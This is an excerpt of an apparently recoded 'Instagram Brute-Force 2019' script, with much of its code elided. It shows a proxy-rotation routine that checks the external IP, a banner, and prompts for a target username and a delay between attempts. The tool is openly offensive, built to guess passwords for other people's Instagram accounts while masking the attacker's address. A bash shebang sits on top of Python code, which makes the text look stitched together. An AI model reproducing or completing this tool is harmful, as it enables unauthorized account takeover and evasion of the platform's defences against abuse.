#!/bin/bash
# Youtube 	: https://www.youtube.com/deparsbomber_
# instagram : @depars_07
...
class Instabrute():
	...
	def randomProxy(self):
		...
		try:
			print('')
			print('[*] Check new ip...')
			print ('[*] Your IP: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
...
os.system('figlet "Depars"')

print(C)

print('                   Recoded by Depars')
...
print('                 Instagram Brute-Force 2019')
...
instabrute = Instabrute(Input('Username: '))

try:
	delayLoop = int(Input('[*] Input Delay (1-10): ')) 
except Exception as e:
